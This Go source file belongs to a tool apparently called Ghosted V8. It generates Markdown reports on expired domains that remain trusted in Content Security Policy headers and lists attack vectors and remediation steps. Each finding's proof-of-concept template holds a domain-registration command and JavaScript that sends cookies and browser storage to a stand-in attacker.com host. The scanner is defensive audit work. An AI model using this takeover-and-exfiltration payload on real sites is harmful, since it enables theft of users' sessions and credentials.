package reporter

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"ghosted-v8/storage"
)

// GenerateHighRiskReport generates high-risk findings report
func GenerateHighRiskReport(db *storage.Database, scanPath string) error {
	available, err := db.GetAvailableDomains()
	if err != nil {
		return fmt.Errorf("failed to get available domains: %w", err)
	}

	if len(available) == 0 {
		fmt.Println("[OK] No high-risk findings (no available domains)")
		return nil
	}

	reportsDir := filepath.Join(scanPath, "reports")
	if err := os.MkdirAll(reportsDir, 0755); err != nil {
		return fmt.Errorf("failed to create reports directory: %w", err)
	}

	reportPath := filepath.Join(reportsDir, "high_risk_findings.md")
	f, err := os.Create(reportPath)
	if err != nil {
		return fmt.Errorf("failed to create report: %w", err)
	}
	defer f.Close()

	// Write header
	f.WriteString("# High-Risk Findings: Available Domains in CSP Policies\n\n")
	f.WriteString(fmt.Sprintf("**Scan Date:** %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	f.WriteString(fmt.Sprintf("**Total High-Risk Domains:** %d\n\n", len(available)))
	f.WriteString("---\n\n")

	// Summary
	f.WriteString("## Executive Summary\n\n")
	f.WriteString(fmt.Sprintf("This scan identified **%d available or expired domains** that are currently trusted in Content Security Policy (CSP) headers. ", len(available)))
	f.WriteString("These domains can be registered by attackers to inject malicious content into trusted applications.\n\n")

	f.WriteString("### Immediate Risk\n")
	f.WriteString("- **XSS/HTML Injection:** Attackers can serve malicious JavaScript or HTML\n")
	f.WriteString("- **CSRF Resurrection:** Cross-site request forgery becomes possible\n")
	f.WriteString("- **Media Replacement:** Phishing via image/media replacement\n")
	f.WriteString("- **Customer Tracking:** Data exfiltration via connect-src\n")
	f.WriteString("- **Supply Chain Attack:** Single domain compromise affects multiple applications\n\n")

	f.WriteString("---\n\n")

	// Detailed findings
	f.WriteString("## Detailed Findings\n\n")

	for i, result := range available {
		f.WriteString(fmt.Sprintf("### %d. %s\n\n", i+1, result.Domain))
		f.WriteString(fmt.Sprintf("**Status:** %s\n", result.Status))
		f.WriteString(fmt.Sprintf("**Checked:** %s\n\n", result.CheckedAt.Format("2006-01-02 15:04:05")))

		// Affected origins - COMPLETE LIST, NO TRUNCATION
		f.WriteString(fmt.Sprintf("**Affected Applications (%d total):**\n\n", len(result.AffectedOrigins)))
		for _, origin := range result.AffectedOrigins {
			f.WriteString(fmt.Sprintf("- %s\n", origin))
		}
		f.WriteString("\n")

		// Attack vectors
		f.WriteString("**Attack Vectors:**\n\n")
		f.WriteString("1. **XSS Injection:** Register domain, serve malicious JavaScript via `script-src`\n")
		f.WriteString("2. **HTML Injection:** Inject phishing content via `frame-src`, `style-src`\n")
		f.WriteString("3. **CSRF Token Theft:** CSP allows cross-origin requests to attacker domain\n")
		f.WriteString("4. **Media Replacement:** Replace logos/images with phishing content\n")
		f.WriteString("5. **Data Exfiltration:** Use `connect-src` to send data to attacker server\n\n")

		// Severity
		severity := "CRITICAL"
		if len(result.AffectedOrigins) > 10 {
			severity = "CRITICAL (WIDESPREAD)"
		}
		f.WriteString(fmt.Sprintf("**Severity:** %s\n\n", severity))

		// Proof of concept
		f.WriteString("**Proof of Concept:**\n\n")
		f.WriteString("```bash\n")
		f.WriteString("# 1. Register domain\n")
		f.WriteString(fmt.Sprintf("aws route53domains register-domain --domain-name %s --region us-east-1\n\n", result.Domain))
		f.WriteString("# 2. Configure DNS to point to attacker server\n")
		f.WriteString("# 3. Serve malicious payload:\n")
		f.WriteString("# HTTP/1.1 200 OK\n")
		f.WriteString("# Content-Type: application/javascript\n")
		f.WriteString("#\n")
		f.WriteString("# // Steal credentials\n")
		f.WriteString("# fetch('https://attacker.com/exfil', {\n")
		f.WriteString("#   method: 'POST',\n")
		f.WriteString("#   body: JSON.stringify({\n")
		f.WriteString("#     cookies: document.cookie,\n")
		f.WriteString("#     localStorage: localStorage,\n")
		f.WriteString("#     sessionStorage: sessionStorage\n")
		f.WriteString("#   })\n")
		f.WriteString("# });\n")
		f.WriteString("```\n\n")

		f.WriteString("---\n\n")
	}

	// Remediation
	f.WriteString("## Remediation Steps\n\n")
	f.WriteString("### Immediate Actions\n\n")
	f.WriteString("1. **Remove Domains from CSP:** Update CSP policies to remove all available/expired domains\n")
	f.WriteString("2. **Monitor Registration:** Set up alerts for domain registration attempts\n")
	f.WriteString("3. **CSP Audit:** Review all CSP policies for other potentially risky domains\n\n")

	f.WriteString("### Strategic Actions\n\n")
	f.WriteString("1. **CSP Policy Review Process:** Implement regular audits of trusted domains\n")
	f.WriteString("2. **Domain Lifecycle Management:** Track expiration dates of trusted third-party domains\n")
	f.WriteString("3. **Subresource Integrity (SRI):** Use SRI hashes for critical external scripts\n")
	f.WriteString("4. **Defense in Depth:** Don't rely solely on CSP for security\n\n")

	f.WriteString("---\n\n")
	f.WriteString("**Report generated by Ghosted V8** • https://thecontractor.io/ghosted/\n")

	fmt.Printf("[OK] High-risk findings report: %s\n", reportPath)
	return nil
}
